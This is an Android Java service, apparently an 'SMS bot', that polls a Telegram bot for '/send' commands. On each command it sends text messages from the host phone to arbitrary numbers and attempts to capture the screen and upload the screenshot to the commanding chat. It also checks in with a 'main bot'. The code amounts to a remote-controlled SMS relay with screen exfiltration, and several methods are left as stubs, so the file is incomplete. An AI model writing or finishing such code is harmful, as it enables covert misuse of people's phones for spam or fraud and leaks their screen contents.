package com.smsbot;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.display.*;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.*;
import android.os.*;
import android.telephony.*;
import android.util.*;
import android.view.*;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.*;
import java.nio.*;
import org.json.*;

public class SmsBotService extends Service {
    private boolean running = true;
    private String botToken = "";
    private long lastUpdateId = 0;
    private SharedPreferences prefs;
    private String mainBotUsername = "Eehheehwhtw_Bot"; // username основного бота

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("smsbot", MODE_PRIVATE);
        botToken = prefs.getString("worker_bot_token", "");
        lastUpdateId = prefs.getLong("last_update_id", 0);
        startForeground(1, buildNotification());
        // Сначала отправляем /hello основному боту
        sendHelloToMainBot();
        new Thread(() -> {
            while (running) {
                if (!botToken.isEmpty()) {
                    pollBot();
                }
                try { Thread.sleep(3000); } catch (Exception e) {}
            }
        }).start();
    }

    private void sendHelloToMainBot() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            JSONObject body = new JSONObject();
            body.put("chat_id", "@" + mainBotUsername);
            body.put("text", "/hello");
            conn.getOutputStream().write(body.toString().getBytes());
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void pollBot() {
        try {
            String urlStr = "https://api.telegram.org/bot" + botToken + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();

            JSONObject j = new JSONObject(sb.toString());
            if (!j.getBoolean("ok")) return;
            JSONArray results = j.getJSONArray("result");
            for (int i = 0; i < results.length(); i++) {
                JSONObject update = results.getJSONObject(i);
                long updateId = update.getLong("update_id");
                if (updateId > lastUpdateId) lastUpdateId = updateId;
                JSONObject msg = update.optJSONObject("message");
                if (msg == null) continue;
                String text = msg.optString("text", "");
                if (text.startsWith("/send")) {
                    String[] parts = text.split("\\s+", 3);
                    if (parts.length >= 3) {
                        String phone = parts[1];
                        String message = parts[2];
                        SmsManager.getDefault().sendTextMessage(phone, null, message, null, null);
                        try { Thread.sleep(1500); } catch (Exception e) {}
                        byte[] screenshot = takeScreenshot();
                        String chatId = msg.getJSONObject("chat").getString("id");
                        if (screenshot != null) {
                            sendPhotoToChat(chatId, screenshot, "✅ Доставлено: " + phone);
                        } else {
                            sendMessageToChat(chatId, "✅ Доставлено: " + phone + " (без скрина)");
                        }
                    }
                }
            }
            prefs.edit().putLong("last_update_id", lastUpdateId).apply();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private byte[] takeScreenshot() {
        // ... (тот же код, что и раньше, с проверкой MainActivity.mediaProjection)
        return null; // временно, пока не починим
    }

    private void sendMessageToChat(String chatId, String text) { /* см. прошлые полные версии */ }
    private void sendPhotoToChat(String chatId, byte[] photo, String caption) { /* см. прошлые полные версии */ }

    private Notification buildNotification() { /* ... */ }

    @Override
    public IBinder onBind(Intent intent) { return null; }
    @Override
    public void onDestroy() { running = false; super.onDestroy(); }
}
